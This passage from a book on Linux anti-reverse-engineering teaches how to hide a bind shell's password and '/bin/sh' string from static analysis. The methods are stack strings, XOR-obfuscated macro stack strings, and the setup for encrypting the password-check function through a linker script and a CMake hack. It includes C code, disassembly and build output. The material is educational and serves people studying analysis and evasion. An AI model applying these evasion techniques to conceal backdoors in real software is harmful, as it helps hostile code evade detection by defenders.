bind shell. Yet, we haven’t protected the binary from one of the first tools in a reverse engineer’s toolbox: strings³⁶. Check out how easy it is to uncover the password:\n\n###### Finding the password in the strings output\n\nalbino-lobster@ubuntu:~/antire_book/chap_3_format_hacks/trouble/build$ strings -a -n \\\n32 ./trouble\nGisfUtI89aMRKJvkz31NuXtq9155kEGa\nResource temporarily unavailable\nAddress family not supported by protocol\nCannot send after socket shutdown\n}&*+<=>?CGJMXYZ[\\]^_`acdefgijklrstyz{|\n\n##### In this build of Trouble the password is “GisfUtI89aMRKJvkz31NuXtq9155kEGa” which just so happens to be the first item in the strings output.\n\n### Code Reorganization\n\n##### Now that you’ve made it to chapter four its time to change how Trouble is compiled. You’ve learned a handful of interesting obfuscation techniques and I want to keep using some of those techniques on/off throughout the remainder of the book. In the previous chapter, you kept having to manually run stripBinary, but that is kind of annoying to have to do everytime. Instead, let’s automate it. In chapter four, you’ll compile Trouble by using the CMakeLists.txt file in the directory “dontpanic”. Later, you’ll see how you can easily add and execute other projects to “dontpanic” by running cmake ..; make once. For now, here is what compiling Trouble in chapter four should look like:\n\n###### ³⁶Strings is a simple utility that outputs all the strings in a provided file. For a full write up see “man strings”.\n\n\n-----\n\n###### Chapter 4: Fighting Off String Analysis 130\n\n Compiling the chapter four version of Trouble\n\nalbino-lobster@ubuntu:~/antire_book$ cd chap_4_static_analysis/dontpanic/\nalbino-lobster@ubuntu:~/antire_book/chap_4_static_analysis/dontpanic$ mkdir build\nalbino-lobster@ubuntu:~/antire_book/chap_4_static_analysis/dontpanic$ cd build/\nalbino-lobster@ubuntu:~/antire_book/chap_4_static_analysis/dontpanic/build$ cmake ..\n-- The C compiler identification is GNU 5.4.0\n-- Check for working C compiler: /usr/bin/cc\n-- Check for working C compiler: /usr/bin/cc -- works\n-- Detecting C compiler ABI info\n-- Detecting C compiler ABI info - done\n-- Detecting C compile features\n-- Detecting C compile features - done\n-- Configuring done\n-- Generating done\n-- Build files have been written to: /home/albino-lobster/antire_book/chap_4_static_a\\\nnalysis/dontpanic/build\nalbino-lobster@ubuntu:~/antire_book/chap_4_static_analysis/dontpanic/build$ make\nScanning dependencies of target trouble\n\n[ 33%] Building C object trouble/CMakeFiles/trouble.dir/src/trouble.c.o\n\n[ 66%] Building C object trouble/CMakeFiles/trouble.dir/src/rc4.c.o\n\n[100%] Linking C executable trouble\nThe bind shell password is: CyrHgAtdD6QfwbS0oso17M5WMOWygWMn\n\n[100%] Built target trouble\nalbino-lobster@ubuntu:~/antire_book/chap_4_static_analysis/dontpanic/build$\n\n##### Not only do all of the projects get compiled, but stripBinary and fakeHeadersXBit get applied to Trouble automatically. The bind shell can now be found in the build directory in the trouble subdirectory.\n\n### Stack Strings\n\n##### One of the the ways to hide strings is to mix the construction of the string with code. This is the basic idea behind a stack string. The goal is to add each byte of the string onto the stack one at a time. For example, consider the string “/bin/sh” in Trouble. Currently, the string is used with execve like so:\n\n\n-----\n\n###### Chapter 4: Fighting Off String Analysis 131\n\nexecve(\"/bin/sh\", empty, empty);\n\n##### The string also appears in the strings output.\n\n###### Finding /bin/bash in Trouble’s string output\n\nalbino-lobster@ubuntu:~/antire_book/chap_4_static_analysis/dontpanic/build$ strings -\\\na ./trouble/trouble | grep \"/bin/sh\"\n/bin/sh\n\n##### You can make simple change to ensure that the “/bin/sh” string is built on the stack and won’t appear in the strings output.\n\n###### Changing how Trouble declares /bin/bash\n\n**char binsh[] = { '/', 'b', 'i', 'n', '/', 's', 'h', 0 };**\nexecve(binsh, empty, empty);\n\n##### Now “/bin/sh” can’t be found by strings.\n\n###### Searching for /bin/sh in the strings output\n\nalbino-lobster@ubuntu:~/antire_book/chap_4_static_analysis/dontpanic/build$ strings -\\\na ./trouble/trouble | grep \"/bin/sh\"\nalbino-lobster@ubuntu:~/antire_book/chap_4_static_analysis/dontpanic/build$\n\n##### Why does this work? Consider the disassembly around execve() before the stack string change:\n\n\n-----\n\n###### Chapter 4: Fighting Off String Analysis 132\n\n Disassembly using normal /bin/sh\n\n.text:0000000000400573 mov [rbp+var_50], 0\n.text:000000000040057B lea rdx, [rbp+var_50]\n.text:000000000040057F lea rax, [rbp+var_50]\n.text:0000000000400583 mov rsi, rax\n.text:0000000000400586 mov edi, offset aBinSh ; \"/bin/sh\"\n.text:000000000040058B call execve\n\n##### As you can plainly see the address for the string “/bin/sh” is stored in edi before the call to execve(). However, check out the stack strings version.\n\n###### Disassembly using stack string /bin/sh\n\n.text:000000000040057F mov [rbp+var_60], 0\n.text:0000000000400587 mov [rbp+var_40], 2Fh\n.text:000000000040058B mov [rbp+var_3F], 62h\n.text:000000000040058F mov [rbp+var_3E], 69h\n.text:0000000000400593 mov [rbp+var_3D], 6Eh\n.text:0000000000400597 mov [rbp+var_3C], 2Fh\n.text:000000000040059B mov [rbp+var_3B], 73h\n.text:000000000040059F mov [rbp+var_3A], 68h\n.text:00000000004005A3 mov [rbp+var_39], 0\n.text:00000000004005A7 lea rdx, [rbp+var_60]\n.text:00000000004005AB lea rcx, [rbp+var_60]\n.text:00000000004005AF lea rax, [rbp+var_40]\n.text:00000000004005B3 mov rsi, rcx\n.text:00000000004005B6 mov rdi, rax\n.text:00000000004005B9 call execve\n\n##### Above you can see that each letter (0x2f, 0x62, 0x69, 0x63, 0x2f, 0x73, 0x68, and NULL) are moved onto the stack one byte at a time. This effectively mixes the string with the code so that tools like strings can’t easily find them.\n\n### FLOSS\n\n###### In 2016 FireEye released an open source tool called “FireEye Labs Obfus- cated String Solved” or FLOSS. Among other things, FLOSS is supposed to find stack strings. However, FLOSS doesn’t fully support ELF binaries and therefore can’t seem to find the stack strings in Trouble. Linux gets no love, huh?\n\n\n-----\n\n###### Chapter 4: Fighting Off String Analysis 133\n\n##### Implementing a stack string as an array of individual chars is pretty useful, but how can we make that work for Trouble’s shell password? Remember that you generate a new shell password whenever the command “cmake” is run and the generated password is passed into Trouble as a macro. The macro is just a string. That means we should be able to index into it as normal and let the compiler clean up the rest. For example, you can change the check_password() function to look like this:\n\n###### Storing the shell password as a stack string\n\n**bool check_password(const char* p_password)**\n{\n\n**char pass[33] =**\n{\npassword[0], password[1], password[2], password[3], password[4],\npassword[5], password[6], password[7], password[8], password[9],\npassword[10], password[11], password[12], password[13], password[14],\npassword[15], password[16], password[17], password[18], password[19],\npassword[20], password[21], password[22], password[23], password[24],\npassword[25], password[26], password[27], password[28], password[29],\npassword[30], password[31], 0\n};\n\n// validate the password\n**return memcmp(pass, p_password, 32) != 0;**\n}\n\n##### The resulting disassembly is larger, but keeps strings from seeing the password.\n\n###### Disassembly of check_password() with the password stored as a stack string\n\n.text:00000000004003F0 public check_password\n.text:00000000004003F0 check_password proc near ; CODE XREF: main+13D p\n.text:00000000004003F0\n.text:00000000004003F0 sub rsp, 38h\n.text:00000000004003F4 mov rsi, rdi\n.text:00000000004003F7 mov edx, 20h\n.text:00000000004003FC mov rdi, rsp\n.text:00000000004003FF mov [rsp+38h+var_38], 4Dh\n.text:0000000000400403 mov [rsp+38h+var_37], 49h\n.text:0000000000400408 mov rax, fs:28h\n.text:0000000000400411 mov [rsp+38h+var_10], rax\n\n\n-----\n\n###### Chapter 4: Fighting Off String Analysis 134\n\n.text:0000000000400416 xor eax, eax\n.text:0000000000400418 mov [rsp+38h+var_36], 6Bh\n.text:000000000040041D mov [rsp+38h+var_35], 4Bh\n.text:0000000000400422 mov [rsp+38h+var_34], 39h\n.text:0000000000400427 mov [rsp+38h+var_33], 61h\n.text:000000000040042C mov [rsp+38h+var_32], 63h\n.text:0000000000400431 mov [rsp+38h+var_31], 58h\n.text:0000000000400436 mov [rsp+38h+var_30], 33h\n.text:000000000040043B mov [rsp+38h+var_2F], 37h\n.text:0000000000400440 mov [rsp+38h+var_2E], 79h\n.text:0000000000400445 mov [rsp+38h+var_2D], 79h\n.text:000000000040044A mov [rsp+38h+var_2C], 5Ah\n.text:000000000040044F mov [rsp+38h+var_2B], 44h\n.text:0000000000400454 mov [rsp+38h+var_2A], 51h\n.text:0000000000400459 mov [rsp+38h+var_29], 46h\n.text:000000000040045E mov [rsp+38h+var_28], 75h\n.text:0000000000400463 mov [rsp+38h+var_27], 76h\n.text:0000000000400468 mov [rsp+38h+var_26], 77h\n.text:000000000040046D mov [rsp+38h+var_25], 4Fh\n.text:0000000000400472 mov [rsp+38h+var_24], 48h\n.text:0000000000400477 mov [rsp+38h+var_23], 33h\n.text:000000000040047C mov [rsp+38h+var_22], 4Bh\n.text:0000000000400481 mov [rsp+38h+var_21], 33h\n.text:0000000000400486 mov [rsp+38h+var_20], 75h\n.text:000000000040048B mov [rsp+38h+var_1F], 52h\n.text:0000000000400490 mov [rsp+38h+var_1E], 78h\n.text:0000000000400495 mov [rsp+38h+var_1D], 4Bh\n.text:000000000040049A mov [rsp+38h+var_1C], 51h\n.text:000000000040049F mov [rsp+38h+var_1B], 43h\n.text:00000000004004A4 mov [rsp+38h+var_1A], 70h\n.text:00000000004004A9 mov [rsp+38h+var_19], 48h\n.text:00000000004004AE mov [rsp+38h+var_18], 0\n.text:00000000004004B3 call memcmp\n.text:00000000004004B8 test eax, eax\n.text:00000000004004BA setnz al\n.text:00000000004004BD mov rcx, [rsp+38h+var_10]\n.text:00000000004004C2 xor rcx, fs:28h\n.text:00000000004004CB jnz short loc_4004D2\n.text:00000000004004CD add rsp, 38h\n.text:00000000004004D1 retn\n.text:00000000004004D2 ; -------------------------------------------.text:00000000004004D2\n.text:00000000004004D2 loc_4004D2: ; CODE XREF: check_pas\\\n\n\n-----\n\n###### Chapter 4: Fighting Off String Analysis 135\n\nsword+DB j\n.text:00000000004004D2 call __stack_chk_fail\n.text:00000000004004D2 check_password endp\n\n##### Finally, just to verify that our stack string code actually worked, check out the strings output.\n\n###### The password no longer appears in the strings output\n\nalbino-lobster@ubuntu:~/antire_book/chap_4_static_analysis/dontpanic/build$ strings -\\\na -n 32 ./trouble/trouble\nResource temporarily unavailable\nAddress family not supported by protocol\nCannot send after socket shutdown\n}&*+<=>?CGJMXYZ[\\]^_`acdefgijklrstyz{|\n\n##### Take that egyp7!³⁷\n\n### XOR Stack String\n\n##### In the previous section you hid Trouble’s shell password from the strings utility by turning it into a stack string. However, the password is still pretty easy to recover\n\n###### ³⁷Obviously, I’m just kidding. egyp7 is great and you should follow him on Twitter.\n\n\n-----\n\n###### Chapter 4: Fighting Off String Analysis 136\n\n##### since each character’s hex representation is visible in the disassembly. Let’s go one step further and XOR each byte so that the reverse engineer can’t just read the values straight from the disassembly.\n\n Before you add in the new XOR logic consider if you had one hundred of these strings that needed to be obfuscated. It isn’t really reasonable to write them out as arrays every single time is it? Let’s use macros to automate this. What is a macro exactly? GCC’s documentation calls it “a fragment of code which has been given a name”³⁸. For our purposes, you can consider macros to be a simple find and replace mechanism. Before you compile the preprocessor will find all calls to the macros and replace them with the actual code defined in the macro. Understand that this is an oversimplification but it’s enough to understand the basics.\n\n I would love to present you with a beautiful recursive macro that prettily creates the stack string. Reality isn’t always as beautiful as we’d like. Recursive macros aren’t possible in C (or C++ for that matter). Therefore, you’re forced to create a new macro for each index in the string. Luckily, I’ve written it for you.\n\n###### chap_4_static_analysis/dontpanic/trouble/src/xor_string.h\n\n/**\n\n - The macros below can be used to generate a stack string that has been\n\n - obfuscated by a given \"key\" (ie 0xaa). The macros are listed from 0-31.\n\n - The length of the string is the number in the macro name. For example, if I\n\n - have an 8 byte string I want to obfuscate then I'd use XOR_STRING7. Why 7?\n\n - Because the macros start at 0.\n*/\n\n#define XOR_STRING0(storage, string, key) storage[0] = string[0] ^ key;\n#define XOR_STRING1(storage, string, key) storage[1] = string[1] ^ key; \\\n\nXOR_STRING0(storage, string, key);\n#define XOR_STRING2(storage, string, key) storage[2] = string[2] ^ key; \\\n\nXOR_STRING1(storage, string, key);\n#define XOR_STRING3(storage, string, key) storage[3] = string[3] ^ key; \\\n\nXOR_STRING2(storage, string, key);\n#define XOR_STRING4(storage, string, key) storage[4] = string[4] ^ key; \\\n\nXOR_STRING3(storage, string, key);\n#define XOR_STRING5(storage, string, key) storage[5] = string[5] ^ key; \\\n\nXOR_STRING4(storage, string, key);\n\n###### ³⁸https://gcc.gnu.org/onlinedocs/gcc-5.1.0/cpp/Macros.html\n\n\n-----\n\n###### Chapter 4: Fighting Off String Analysis 137\n\n#define XOR_STRING6(storage, string, key) storage[6] = string[6] ^ key; \\\n\nXOR_STRING5(storage, string, key);\n#define XOR_STRING7(storage, string, key) storage[7] = string[7] ^ key; \\\n\nXOR_STRING6(storage, string, key);\n#define XOR_STRING8(storage, string, key) storage[8] = string[8] ^ key; \\\n\nXOR_STRING7(storage, string, key);\n#define XOR_STRING9(storage, string, key) storage[9] = string[9] ^ key; \\\n\nXOR_STRING8(storage, string, key);\n#define XOR_STRING10(storage, string, key) storage[10] = string[10] ^ key; \\\n\nXOR_STRING9(storage, string, key);\n#define XOR_STRING11(storage, string, key) storage[11] = string[11] ^ key; \\\n\nXOR_STRING10(storage, string, key);\n#define XOR_STRING12(storage, string, key) storage[12] = string[12] ^ key; \\\n\nXOR_STRING11(storage, string, key);\n#define XOR_STRING13(storage, string, key) storage[13] = string[13] ^ key; \\\n\nXOR_STRING12(storage, string, key);\n#define XOR_STRING14(storage, string, key) storage[14] = string[14] ^ key; \\\n\nXOR_STRING13(storage, string, key);\n#define XOR_STRING15(storage, string, key) storage[15] = string[15] ^ key; \\\n\nXOR_STRING14(storage, string, key);\n#define XOR_STRING16(storage, string, key) storage[16] = string[16] ^ key; \\\n\nXOR_STRING15(storage, string, key);\n#define XOR_STRING17(storage, string, key) storage[17] = string[17] ^ key; \\\n\nXOR_STRING16(storage, string, key);\n#define XOR_STRING18(storage, string, key) storage[18] = string[18] ^ key; \\\n\nXOR_STRING17(storage, string, key);\n#define XOR_STRING19(storage, string, key) storage[19] = string[19] ^ key; \\\n\nXOR_STRING18(storage, string, key);\n#define XOR_STRING20(storage, string, key) storage[20] = string[20] ^ key; \\\n\nXOR_STRING19(storage, string, key);\n#define XOR_STRING21(storage, string, key) storage[21] = string[21] ^ key; \\\n\nXOR_STRING20(storage, string, key);\n#define XOR_STRING22(storage, string, key) storage[22] = string[22] ^ key; \\\n\nXOR_STRING21(storage, string, key);\n#define XOR_STRING23(storage, string, key) storage[23] = string[23] ^ key; \\\n\nXOR_STRING22(storage, string, key);\n#define XOR_STRING24(storage, string, key) storage[24] = string[24] ^ key; \\\n\nXOR_STRING23(storage, string, key);\n#define XOR_STRING25(storage, string, key) storage[25] = string[25] ^ key; \\\n\nXOR_STRING24(storage, string, key);\n#define XOR_STRING26(storage, string, key) storage[26] = string[26] ^ key; \\\n\nXOR_STRING25(storage, string, key);\n#define XOR_STRING27(storage, string, key) storage[27] = string[27] ^ key; \\\n\n\n-----\n\n###### Chapter 4: Fighting Off String Analysis 138\n\nXOR_STRING26(storage, string, key);\n#define XOR_STRING28(storage, string, key) storage[28] = string[28] ^ key; \\\n\nXOR_STRING27(storage, string, key);\n#define XOR_STRING29(storage, string, key) storage[29] = string[29] ^ key; \\\n\nXOR_STRING28(storage, string, key);\n#define XOR_STRING30(storage, string, key) storage[30] = string[30] ^ key; \\\n\nXOR_STRING29(storage, string, key);\n#define XOR_STRING31(storage, string, key) storage[31] = string[31] ^ key; \\\n\nXOR_STRING30(storage, string, key);\n\n/** This function deobfuscates the string. It isn't a macro because we don't\n\n - want to do this at compile time. We want to do it at run time.\n \n - \\param[in,out] p_string the string to deobfuscate\n\n - \\param[in] p_length the length of the string\n\n - \\param[in] p_key the \"key\" to deobfuscate with\n \n - \\note p_string will be deobfuscated. So if you call this function with\n - p_string *a second time* then it will get reobfuscated.\n*/\n**char* undo_xor_string(char* string, int length, char key)**\n{\n\n**for (int i = 0; i < length; i++)**\n{\nstring[i] = string[i] ^ key;\n}\n**return string;**\n}\n\n##### I’m sure you are thinking, “Boy, that sure is ugly. Couldn’t we just use a for loop?”. Maybe something like this:\n\n#define XOR_FOR_REAL(storage, string, size, key) \\\n\nfor (int i = 0; i < size; i++) { \\\n\nstorage[i] = string[i] ^ key; \\\n}\n\n##### Alas, no. Remember that a macro is basically a placeholder for the defined code fragment. Calling XOR_STRING31 will result in 32 lines of code replacing “XOR_- STRING31”. XOR_FOR_REAL would result in three lines of replacement code. A for\n\n\n-----\n\n###### Chapter 4: Fighting Off String Analysis 139\n\n##### loop will not reliably³⁹ generate a stack string (ie. the “stack string” would be present in the strings output). Therefore, we are stuck with the “many macros” solution.\n\n Now you can rewrite check_password() to use one of the XOR_STRING macros.\n\n###### Changing check_password() to use an XOR obfuscated stack string\n\n#include \"xor_string.h\"\n\n**bool check_password(const char* p_password)**\n{\n\n**char pass[password_size] = {};**\nXOR_STRING31(pass, password, 0xaa);\n\n// validate the password\n**return memcmp(undo_xor_string(pass, 32, 0xaa), p_password, 32) != 0;**\n}\n\n##### Now the password isn’t quite as clear in the diassembly.\n\n###### Disassembly over the XOR obfuscated stack string in check_password()\n\n.text:00000000004008E0 check_password proc near ; CODE XREF: main+13C p\n.text:00000000004008E0\n.text:00000000004008E0 sub rsp, 38h\n.text:00000000004008E4 mov rsi, rdi\n.text:00000000004008E7 mov edx, 20h\n.text:00000000004008EC mov rax, fs:28h\n.text:00000000004008F5 mov [rsp+38h+var_10], rax\n.text:00000000004008FA xor eax, eax\n.text:00000000004008FC mov [rsp+38h+var_18], 0\n.text:0000000000400901 mov byte ptr [rsp+38h+var_28+0Fh], 0F0h\n.text:0000000000400906 mov rdi, rsp\n.text:0000000000400909 mov byte ptr [rsp+38h+var_28+0Eh], 0DBh\n.text:000000000040090E mov byte ptr [rsp+38h+var_28+0Dh], 0F2h\n.text:0000000000400913 mov byte ptr [rsp+38h+var_28+0Ch], 0C4h\n.text:0000000000400918 mov byte ptr [rsp+38h+var_28+0Bh], 0E6h\n.text:000000000040091D mov byte ptr [rsp+38h+var_28+0Ah], 0E7h\n.text:0000000000400922 mov byte ptr [rsp+38h+var_28+9], 0C3h\n\n###### ³⁹Note that I was careful with my wording here because it is theoretically possible for the loop to get unrolled by the\noptimizer and that might generate a stack string. However, that can’t be relied upon and I’m not even truly certain if its\npossible.\n\n\n-----\n\n###### Chapter 4: Fighting Off String Analysis 140\n\n.text:0000000000400927 mov byte ptr [rsp+38h+var_28+8], 0E7h\n.text:000000000040092C mov byte ptr [rsp+38h+var_28+7], 0FBh\n.text:0000000000400931 mov byte ptr [rsp+38h+var_28+6], 0E0h\n.text:0000000000400936 mov byte ptr [rsp+38h+var_28+5], 0C5h\n.text:000000000040093B mov byte ptr [rsp+38h+var_28+4], 0DBh\n.text:0000000000400940 mov byte ptr [rsp+38h+var_28+3], 92h\n.text:0000000000400945 mov byte ptr [rsp+38h+var_28+2], 0FBh\n.text:000000000040094A mov byte ptr [rsp+38h+var_28+1], 0F9h\n.text:000000000040094F mov byte ptr [rsp+38h+var_28], 0E5h\n.text:0000000000400954 mov byte ptr [rsp+38h+var_38+0Fh], 0E3h\n.text:0000000000400959 mov byte ptr [rsp+38h+var_38+0Eh], 0DDh\n.text:000000000040095E mov byte ptr [rsp+38h+var_38+0Dh], 99h\n.text:0000000000400963 mov byte ptr [rsp+38h+var_38+0Ch], 0FBh\n.text:0000000000400968 mov byte ptr [rsp+38h+var_38+0Bh], 0C2h\n.text:000000000040096D mov byte ptr [rsp+38h+var_38+0Ah], 0E9h\n.text:0000000000400972 mov byte ptr [rsp+38h+var_38+9], 0F0h\n.text:0000000000400977 mov byte ptr [rsp+38h+var_38+8], 0F8h\n.text:000000000040097C mov byte ptr [rsp+38h+var_38+7], 0F9h\n.text:0000000000400981 mov byte ptr [rsp+38h+var_38+6], 0D2h\n.text:0000000000400986 mov byte ptr [rsp+38h+var_38+5], 0D2h\n.text:000000000040098B mov byte ptr [rsp+38h+var_38+4], 0C4h\n.text:0000000000400990 mov byte ptr [rsp+38h+var_38+3], 0E8h\n.text:0000000000400995 mov byte ptr [rsp+38h+var_38+2], 0EBh\n.text:000000000040099A mov byte ptr [rsp+38h+var_38+1], 0E7h\n.text:000000000040099F mov byte ptr [rsp+38h+var_38], 0E0h\n.text:00000000004009A3 movdqa xmm0, cs:xmmword_401A20\n.text:00000000004009AB movdqa xmm1, [rsp+38h+var_38]\n.text:00000000004009B0 pxor xmm1, xmm0\n.text:00000000004009B4 pxor xmm0, [rsp+38h+var_28]\n.text:00000000004009BA movaps [rsp+38h+var_38], xmm1\n.text:00000000004009BE movaps [rsp+38h+var_28], xmm0\n.text:00000000004009C3 call memcmp\n.text:00000000004009C8 test eax, eax\n.text:00000000004009CA setnz al\n.text:00000000004009CD mov rcx, [rsp+38h+var_10]\n.text:00000000004009D2 xor rcx, fs:28h\n.text:00000000004009DB jnz short loc_4009E2\n.text:00000000004009DD add rsp, 38h\n.text:00000000004009E1 retn\n.text:00000000004009E2 ; --------------------------------------------.text:00000000004009E2\n.text:00000000004009E2 loc_4009E2: ; CODE XREF: check_password+FB j\n.text:00000000004009E2 call __stack_chk_fail\n\n\n-----\n\n###### Chapter 4: Fighting Off String Analysis 141\n\n.text:00000000004009E2 check_password endp\n\n##### That is harder to pull the password out of (especially when you don’t know the key). As a reverse engineer, if you ever come across XOR encoded data there are two well known tools for finding and decoding the data.\n\n 1. XORSearch⁴⁰ by Didier Stevens 2. xortool⁴¹ by “hellman”\n\n However, note that you’ve already defeated these tools simply by using XOR in conjunction with a stack string.\n\n### Function Encryption\n\n##### Generating XOR obfuscated stack strings is pretty handy, but it won’t slow down a good reverse engineer. You need something more powerful to hide the bind shell password. Let’s try encrypting the entire check_password() function.\n\n#### Computing the Function’s Size Using a Linker Script\n\n##### The first problem you’ll face when trying to figure out how to encrypt a function is how to determine the size of the function. Unfortuntely, many people seem to come up with the following solution.\n\n###### ⁴⁰https://blog.didierstevens.com/programs/xorsearch/ ⁴¹https://github.com/hellman/xortool\n\n\n-----\n\n###### Chapter 4: Fighting Off String Analysis 142\n\n Psuedo code for badly computing a functions size\n\n**void a_function()**\n{\n}\n\n**void b_function()**\n{\n}\n\n**void c_function()**\n{\n\n**int a_function_length = b_function - a_function();**\n}\n\n##### This method makes the assumption that, when compiled, b_function() will imme- diately follow a_function(). This might work. It might not. It totally depends on what the compiler has decided to do with your code. A fool proof way of finding a function’s size is to use a linker script⁴². The linker script describes how sections are mapped in the binary. Normally, you don’t worry about the linker script because the linker uses an internal script. You can see the default internal script by passing the verbose option to the linker (note that the following output is truncated because it goes on for a while).\n\n###### Finding the default linker script\n\nalbino-lobster@ubuntu:~$ gcc empty.c -Wl,-verbose\nGNU ld (GNU Binutils for Ubuntu) 2.26.1\nSupported emulations:\nelf_x86_64\nelf32_x86_64\nelf_i386\nelf_iamcu\ni386linux\nelf_l1om\nelf_k1om\ni386pep\ni386pe\n\n###### ⁴²https://sourceware.org/binutils/docs/ld/Scripts.html#Scripts\n\n\n-----\n\n###### Chapter 4: Fighting Off String Analysis 143\n\nusing internal linker script:\n==================================================\n/* Script for -z combreloc: combine and sort reloc sections */\n/* Copyright (C) 2014-2015 Free Software Foundation, Inc.\nCopying and distribution of this script, with or without modification,\nare permitted in any medium without royalty provided the copyright\nnotice and this notice are preserved. */\nOUTPUT_FORMAT(\"elf64-x86-64\", \"elf64-x86-64\",\n\n\"elf64-x86-64\")\nOUTPUT_ARCH(i386:x86-64)\nENTRY(_start)\nSEARCH_DIR(\"=/usr/local/lib/x86_64-linux-gnu\"); SEARCH_DIR(\"=/lib/x86_64-linux-gnu\");\\\n\nSEARCH_DIR(\"=/usr/lib/x86_64-linux-gnu\"); SEARCH_DIR(\"=/usr/local/lib64\"); SEARCH_DI\\\nR(\"=/lib64\"); SEARCH_DIR(\"=/usr/lib64\"); SEARCH_DIR(\"=/usr/local/lib\"); SEARCH_DIR(\"=\\\n/lib\"); SEARCH_DIR(\"=/usr/lib\"); SEARCH_DIR(\"=/usr/x86_64-linux-gnu/lib64\"); SEARCH_D\\\nIR(\"=/usr/x86_64-linux-gnu/lib\");\nSECTIONS\n{\n\n/* Read-only sections, merged into text segment: */\nPROVIDE (__executable_start = SEGMENT_START(\"text-segment\", 0x400000)); . = SEGMENT\\\n_START(\"text-segment\", 0x400000) + SIZEOF_HEADERS;\n.interp : { *(.interp) }\n.note.gnu.build-id : { *(.note.gnu.build-id) }\n.hash : { *(.hash) }\n.gnu.hash : { *(.gnu.hash) }\n.dynsym : { *(.dynsym) }\n.dynstr : { *(.dynstr) }\n.gnu.version : { *(.gnu.version) }\n.gnu.version_d : { *(.gnu.version_d) }\n.gnu.version_r : { *(.gnu.version_r) }\n\n##### However, you can provide the linker with your own script to complement or replace the default script. For example, the following script will create a symbol called check_password_size that will contain the length of the section named .check_pass- word.\n\n\n-----\n\n###### Chapter 4: Fighting Off String Analysis 144\n\n chap_4_static_analysis/dontpanic/trouble/trouble_layout.lds\n\nSECTIONS\n{\ncheck_password_size = SIZEOF(.check_password);\n}\n\n##### There is a problem though. Currently, check_password() is in the .text section. You need to change the function definition so that it gets placed into its own section. This can be accomplished using GCC’s function attributes feature⁴³. Update the function definition of check_password() to look like this:\n\n###### Using the section name attribute on check_password()\n\n**bool __attribute__((section(\".check_password\"))) check_password(const char* p_passwor\\**\nd)\n{\n\n**char pass[password_size] = {};**\nXOR_STRING31(pass, password, 0xaa);\n\n// validate the password\n**return memcmp(undo_xor_string(pass, 32, 0xaa), p_password, 32) != 0;**\n}\n\n##### If you recompile Trouble and don’t strip the sections table, you can confirm that a special section .check_password section was created.\n\n###### ⁴³https://gcc.gnu.org/onlinedocs/gcc/Common-Function-Attributes.html#Common-Function-Attributes\n\n\n-----\n\n###### Chapter 4: Fighting Off String Analysis 145\n\n Viewing .check_password in readelf\n\nalbino-lobster@ubuntu:~/antire_book/chap_4_static_analysis/dontpanic/build$ readelf -\\\nS ./trouble/trouble\nThere are 13 section headers, starting at offset 0x31c8:\n\nSection Headers:\n\n[Nr] Name Type Address Offset\nSize EntSize Flags Link Info Align\n\n[ 0] NULL 0000000000000000 00000000\n0000000000000000 0000000000000000 0 0 0\n\n[ 1] .init PROGBITS 0000000000400120 00000120\n0000000000000003 0000000000000000 AX 0 0 1\n\n[ 2] .text PROGBITS 0000000000400130 00000130\n000000000000173f 0000000000000000 AX 0 0 16\n\n[ 3] .check_password PROGBITS 0000000000401870 00001870\n0000000000000107 0000000000000000 AX 0 0 16\n\n[ 4] .fini PROGBITS 0000000000401977 00001977\n0000000000000003 0000000000000000 AX 0 0 1\n\n[ 5] .rodata PROGBITS 0000000000401980 00001980\n0000000000000858 0000000000000000 A 0 0 64\n\n[ 6] .eh_frame PROGBITS 00000000004021d8 000021d8\n0000000000000004 0000000000000000 A 0 0 4\n\n[ 7] .init_array INIT_ARRAY 0000000000602fe8 00002fe8\n0000000000000008 0000000000000000 WA 0 0 8\n\n[ 8] .fini_array FINI_ARRAY 0000000000602ff0 00002ff0\n0000000000000008 0000000000000000 WA 0 0 8\n\n[ 9] .jcr PROGBITS 0000000000602ff8 00002ff8\n0000000000000008 0000000000000000 WA 0 0 8\n\n[10] .data PROGBITS 0000000000603000 00003000\n0000000000000160 0000000000000000 WA 0 0 64\n\n[11] .bss NOBITS 0000000000603180 00003160\n0000000000000320 0000000000000000 WA 0 0 64\n\n[12] .shstrtab STRTAB 0000000000000000 00003160\n0000000000000067 0000000000000000 0 0 1\nKey to Flags:\nW (write), A (alloc), X (execute), M (merge), S (strings), l (large)\nI (info), L (link order), G (group), T (TLS), E (exclude), x (unknown)\nO (extra OS processing required) o (OS specific), p (processor specific)\n\n##### Great! Now you need to add a definition for check_password_size so that Trouble knows the size of the check_password() function at run time. You can add this line\n\n\n-----\n\n###### Chapter 4: Fighting Off String Analysis 146\n\n##### above the check_password function.\n\n**extern void* check_password_size;**\n\n##### If you recompile and look for check_password_size in the symbol table you won’t find it. The reason is that you haven’t added the logic to use the linker script yet. Unfortunately, this is one of the few places that CMake has fails us. There is no way to actually pass a script to the linker in CMake. I was forced to hack it in. Trouble’s CMakeList.txt should be updated to look like this:\n\n###### Using sed to insert the linker script into CMake\n\nproject(trouble C)\ncmake_minimum_required(VERSION 3.0)\n\n# This will create a 32 byte \"password\" for the bind shell. This command\n# is only run when \"cmake\" is run, so if you want to generate a new password\n# then \"cmake ..; make\" should be run from the command line.\nexec_program(\"/bin/sh\"\n\n${CMAKE_CURRENT_SOURCE_DIR}\nARGS \"-c 'cat /dev/urandom | tr -dc a-zA-Z0-9 | head -c 32'\"\nOUTPUT_VARIABLE random_password )\n\n# Pass the random password into ${PROJECT_NAME} as a macro\nadd_definitions(-Dpassword=\"${random_password}\" -Dpassword_size=33)\n\nset(CMAKE_C_COMPILER musl-gcc)\nset(CMAKE_C_FLAGS \"-Wall -Wextra -Wshadow -O3 -funroll-loops -fno-asynchronous-unwind\\\n-tables -static -std=gnu11\")\nadd_executable(${PROJECT_NAME} src/trouble.c)\n\nadd_custom_target(addLDS\n\nCOMMAND sed -i -e 's,-o,${CMAKE_CURRENT_SOURCE_DIR}/trouble_layout.\\\nlds -o,g' ./CMakeFiles/trouble.dir/link.txt)\n\nadd_dependencies(${PROJECT_NAME} addLDS)\n\n# After the build is successful, display the random password to the user\nadd_custom_command(TARGET ${PROJECT_NAME} POST_BUILD\n\nCOMMAND ${CMAKE_COMMAND} -E echo\n\"The bind shell password is:\" ${random_password})\n\n\n-----\n\n###### Chapter 4: Fighting Off String Analysis 147\n\n##### The imporant part that was added is the addLDS logic. This uses the sed utility to insert the new linker script into the linker options deep within CMake’s generated files. You can verify that this actually works by recompiling Trouble and looking for check_password_size in the symbol table.\n\n###### Verifying that the linker script hack worked\n\nalbino-lobster@ubuntu:~/antire_book/chap_4_static_analysis/dontpanic/build$ readelf -\\\ns ./trouble/trouble | grep size\n96: 0000000000000107 